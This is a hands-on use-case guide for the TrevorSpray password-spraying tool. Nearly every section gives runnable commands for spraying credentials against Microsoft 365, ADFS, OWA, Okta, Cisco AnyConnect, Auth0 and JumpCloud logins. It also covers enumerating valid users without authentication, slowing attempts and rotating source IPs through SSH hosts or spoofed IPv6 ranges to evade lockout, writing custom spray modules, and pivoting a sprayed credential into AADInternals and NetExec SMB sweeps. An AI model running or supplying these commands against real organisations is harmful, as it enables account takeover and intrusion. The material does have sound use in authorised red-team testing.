# TrevorSpray — Hands-On Use Cases

Every scenario below maps to an item in `01 - Overview.md`'s Quick Use-Case List. All commands verified against `trevorspray/cli.py` (v2.4.0).

## Contents
- [Baseline Password Spray Against O365](#baseline-password-spray-against-o365)
- [Unauthenticated Domain Recon Before Touching a Login Endpoint](#unauthenticated-domain-recon-before-touching-a-login-endpoint)
- [Spraying a Federated (ADFS) Tenant](#spraying-a-federated-adfs-tenant)
- [Spraying an On-Prem/Hybrid OWA Front-End with Internal Usernames](#spraying-an-on-premhybrid-owa-front-end-with-internal-usernames)
- [Spraying an Okta-Fronted Tenant](#spraying-an-okta-fronted-tenant)
- [Spraying a Cisco AnyConnect VPN Portal](#spraying-a-cisco-anyconnect-vpn-portal)
- [Spraying an Auth0 or JumpCloud IdP](#spraying-an-auth0-or-jumpcloud-idp)
- [Unauthenticated User Enumeration Before Spraying](#unauthenticated-user-enumeration-before-spraying)
- [Rate-Limited, Jittered Spray to Respect Smart Lockout](#rate-limited-jittered-spray-to-respect-smart-lockout)
- [IP-Diverse Spray via SSH Round-Robin](#ip-diverse-spray-via-ssh-round-robin)
- [IPv6-Subnet Spoofed Spray for Near-Unlimited Source Addresses](#ipv6-subnet-spoofed-spray-for-near-unlimited-source-addresses)
- [Proxying Through Burp Suite for Manual Inspection](#proxying-through-burp-suite-for-manual-inspection)
- [Exit-on-First-Hit Quick Validity Check](#exit-on-first-hit-quick-validity-check)
- [Resuming an Interrupted Spray](#resuming-an-interrupted-spray)
- [Quiet Credential Check Without the Legacy-Auth Loot Burst](#quiet-credential-check-without-the-legacy-auth-loot-burst)
- [Writing a Custom Spray Module](#writing-a-custom-spray-module)
- [Chained Workflow — Feeding a Valid Credential Into AADInternals/NetExec](#chained-workflow--feeding-a-valid-credential-into-aadinternalsnetexec)

---

## Baseline Password Spray Against O365

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/) Brute Force: Password Spraying, [T1078.004](https://attack.mitre.org/techniques/T1078/004/) Valid Accounts: Cloud Accounts

```bash
trevorspray -u users.txt -p 'Summer2026!' -m msol
```

One password, many users, single source IP, no evasion — the default `msol` module targets `login.microsoft.com` directly. This is also the shape used for a many-users × many-passwords matrix:

```bash
trevorspray -u users.txt -p passwords.txt -m msol
```

## Unauthenticated Domain Recon Before Touching a Login Endpoint

**MITRE ATT&CK:** [T1590.005](https://attack.mitre.org/techniques/T1590/005/) Gather Victim Network Information: IP Addresses (DNS), [T1589.002](https://attack.mitre.org/techniques/T1589/002/) Gather Victim Identity Information: Email Addresses (tenant/domain enumeration)

```bash
trevorspray --recon evilcorp.com
```

Confirms tenant ID, `NameSpaceType` (Managed vs. Federated — tells you `msol` vs. `adfs`), sibling tenant domains, and probes for an exposed OWA front-end (with its NTLM internal-domain leak). Export the sibling-domain list for later use:

```bash
trevorspray --recon evilcorp.com --export-tenants evilcorp_domains.txt
```

## Spraying a Federated (ADFS) Tenant

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

Once `--recon` confirms `NameSpaceType: Federated`, target the discovered ADFS AuthURL (or let the module auto-detect it from the domain):

```bash
trevorspray -u users.txt -p 'Summer2026!' -m adfs --url evilcorp.com
```

## Spraying an On-Prem/Hybrid OWA Front-End with Internal Usernames

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/), [T1589](https://attack.mitre.org/techniques/T1589/) Gather Victim Identity Information

OWA typically expects the **internal** username format, not the email address — the module's own startup warning flags this. Use the internal domain recovered during `--recon` (via the NTLM leak):

```bash
trevorspray -m owa --url https://webmail.evilcorp.com -u internal_users.txt -p 'Summer2026!'
```

If the internal AD domain is `CORP.LOCAL`, usernames in the file should be formatted `CORP.LOCAL\username`.

## Spraying an Okta-Fronted Tenant

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
trevorspray -m okta --url customer.okta.com -u users.txt -p 'Summer2026!' -d 5
```

The `okta` module's own `initialize()` warns that Okta hides lockout failures by default — `-d 5` (or higher) is effectively required to spray this module responsibly and get meaningful `locked` signal at all.

## Spraying a Cisco AnyConnect VPN Portal

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/), [T1133](https://attack.mitre.org/techniques/T1133/) External Remote Services

```bash
trevorspray -m anyconnect --url https://vpn.evilcorp.com -u users.txt -p 'Summer2026!'
```

Useful when AD credentials found via O365 spraying are suspected to also unlock a corporate VPN concentrator.

## Spraying an Auth0 or JumpCloud IdP

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
trevorspray -m auth0 -u users.txt -p 'Summer2026!'
trevorspray -m jumpcloud -u users.txt -p 'Summer2026!'
```

Both modules perform a pre-auth `GET`/XSRF-token fetch internally before the credential POST — no extra flags needed, just select the module.

## Unauthenticated User Enumeration Before Spraying

**MITRE ATT&CK:** [T1589.002](https://attack.mitre.org/techniques/T1589/002/) Gather Victim Identity Information: Email Addresses, [T1087.004](https://attack.mitre.org/techniques/T1087/004/) Account Discovery: Cloud Account

```bash
trevorspray --recon evilcorp.com -u candidate_users.txt -ue onedrive -t 10
```

Confirms which candidate usernames have a real OneDrive personal site before any password is ever attempted — trims the target list and avoids wasting spray budget (and lockout risk) on non-existent accounts. Swap `-ue teams_photo` or `-ue seamless_sso` for the alternate methods; the tool's own code flags `seamless_sso` as unreliable at volume.

## Rate-Limited, Jittered Spray to Respect Smart Lockout

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/), [T1562.001](https://attack.mitre.org/techniques/T1562/001/) Impair Defenses (evading lockout-based defenses)

```bash
trevorspray -u users.txt -p 'Summer2026!' -d 60 -j 20 -ld 300
```

60±20 second delay between requests, plus a full 5-minute extra sleep on any detected lockout response — deliberately slow to stay well under Smart Lockout's per-IP attempt threshold.

## IP-Diverse Spray via SSH Round-Robin

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/), [T1090](https://attack.mitre.org/techniques/T1090/) Proxy

```bash
trevorspray -u users.txt -p 'Summer2026!' -s root@203.0.113.10 root@203.0.113.20 root@203.0.113.30 -k ~/.ssh/id_ed25519 -d 10
```

Three VPS egress points round-robin the spray; the operator's own current IP joins the rotation once per round unless `-n` is added. `-d 10` is applied **per IP**, so with 3 hosts the effective aggregate rate is roughly 3× that of a single-IP spray at the same per-host delay — `cli.py` prints the exact computed rate at startup.

## IPv6-Subnet Spoofed Spray for Near-Unlimited Source Addresses

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/), [T1090](https://attack.mitre.org/techniques/T1090/) Proxy

```bash
sudo trevorspray -u users.txt -p 'Summer2026!' --subnet 2001:db8:1234::/64 --interface eth0 -t 20
```

Requires root and `iptables`, and genuine routed IPv6 transit for the announced /64 — spoofing the source address alone doesn't grant reachability for return traffic if the range isn't actually routed to the operator's box. `-6/--prefer-ipv6` is auto-enabled when an IPv6 subnet is detected.

## Proxying Through Burp Suite for Manual Inspection

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
trevorspray -u users.txt -p 'Summer2026!' --proxy http://127.0.0.1:8080
```

Useful for validating a module's exact request shape against a target before committing to a full spray, or for manually replaying/modifying a single credential attempt. Mutually exclusive with `--ssh`.

## Exit-on-First-Hit Quick Validity Check

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
trevorspray -u users.txt -p 'Summer2026!' -e
```

Stops the entire spray (all proxy threads) the instant one valid credential is found — useful for a fast "is this password reused anywhere in this org" check without burning the rest of the user list.

## Resuming an Interrupted Spray

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
trevorspray -u users.txt -p passwords.txt -m msol
# ...interrupted (network drop, Ctrl+C, etc.)...
trevorspray -u users.txt -p passwords.txt -m msol
```

No special flag needed — re-running the identical command automatically skips every `user:password` combo already recorded in `~/.trevorspray/tried_logins.txt` for this module+URL. To deliberately re-attempt everything (e.g. after a password-policy change window), add `-f/--force`.

## Quiet Credential Check Without the Legacy-Auth Loot Burst

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
trevorspray -u users.txt -p 'Summer2026!' -nl
```

Skips the automatic IMAP/SMTP/POP3/EWS/EAS/EXO/Autodiscover/UM/Azure-management legacy-auth burst described in `01 - Overview.md` — appropriate when the objective is only "does this credential work," not "which MFA-free protocols does it also unlock," since the loot phase multiplies the number of distinct authentication events logged per hit by roughly 9×.

## Writing a Custom Spray Module

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```python
# trevorspray/lib/sprayers/mycustom.py
from .base import BaseSprayModule

class MyCustom(BaseSprayModule):
    default_url = "https://target.example.com/login"
    request_data = {"user": "{username}", "pass": "{password}"}

    def check_response(self, response):
        valid = response.status_code == 200
        return (valid, True, False, f"HTTP {response.status_code}")
```

```bash
trevorspray -m mycustom -u users.txt -p 'Summer2026!'
```

New modules under `sprayers/` are auto-discovered by filename at import time — no registration step needed beyond subclassing `BaseSprayModule` and implementing `check_response()`.

## Chained Workflow — Feeding a Valid Credential Into AADInternals/NetExec

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/) → [T1078](https://attack.mitre.org/techniques/T1078/) Valid Accounts

```bash
# 1. Spray and confirm a hit
trevorspray -u users.txt -p 'Summer2026!' -e
# ~/.trevorspray/valid_logins.txt now contains "user@evilcorp.com:Summer2026!"

# 2a. Cloud-side: pivot into deeper Entra enumeration
Get-AADIntAccessTokenForAADGraph -Credentials $cred   # see ../../AADInternals/

# 2b. On-prem: if --recon confirmed a hybrid-identity tenant, test password reuse
netexec smb 10.0.0.0/24 -u user -p 'Summer2026!'      # see ../../NetExec/
```

A confirmed valid cloud credential is frequently reused for the same user's on-prem AD account in hybrid-identity organizations — `--recon`'s tenant/federation findings from earlier in the engagement tell you whether that pivot is worth attempting.
